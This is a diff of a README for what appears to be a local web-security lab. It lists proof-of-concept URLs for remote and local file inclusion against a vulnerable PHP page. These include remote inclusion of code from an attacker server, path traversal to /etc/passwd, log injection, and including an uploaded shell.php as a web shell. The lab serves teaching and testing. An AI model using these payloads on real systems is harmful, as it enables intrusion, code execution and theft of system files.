@@ -24,14 +24,34 @@ For the RFI payloads you have to change the IP to the IP from the internal netwo
 
 ### RFI 
 
-- [http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?](http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?)
+PoCs RFI:
 
-see `allow_url_include` in response
+- [http://127.0.0.1:8883/lfi.php?language=http://google.com?q=](http://127.0.0.1:8883/lfi.php?language=http://google.com?q=)
 
-- [http://127.0.0.1:8883/lfi.php?page=http://google.com](http://127.0.0.1:8883/lfi.php?page=http://google.com)
+- [http://127.0.0.1:8883/lfi.php?page=http://textfiles.com](http://127.0.0.1:8883/lfi.php?page=http://textfiles.com)
 
+Code running on the victim server:
 
-### etc/passwd
+- [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_victim.txt](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_victim.txt)
+
+Code running on the attacker server:
+
+- [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php)
+
+### LFI
+
+#### Verification
+
+Upload check.php from attacker-server src folder
+
+then:
+
+- [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) or
+- [http://127.0.0.1:8883/lfi.php?language=uploads/check](http://127.0.0.1:8883/lfi.php?language=uploads/check)
+
+#### Exploits
+
+#### etc/passwd
 
 [http://127.0.0.1:8883/lfi.php?page=/etc/passwd](http://127.0.0.1:8883/lfi.php?page=/etc/passwd)
 
@@ -39,7 +59,7 @@ By way of experiment add `../` before `etc/passwd` until ...
 
 [http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd](http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd)
 
-### Log Injection
+#### Log Injection
 
 Get `access.log`: 
 
@@ -60,18 +80,7 @@ and
 
 Check for uid in output
 
-### LFI
-
-#### Verification
-
-Upload check.php from attacker-server src folder
-
-then:
-
-- [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) or
-- [http://127.0.0.1:8883/lfi.php?language=uploads/check](http://127.0.0.1:8883/lfi.php?language=uploads/check)
-
-#### Exploit
+#### Shell
 
 Upload shell.php
 [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)
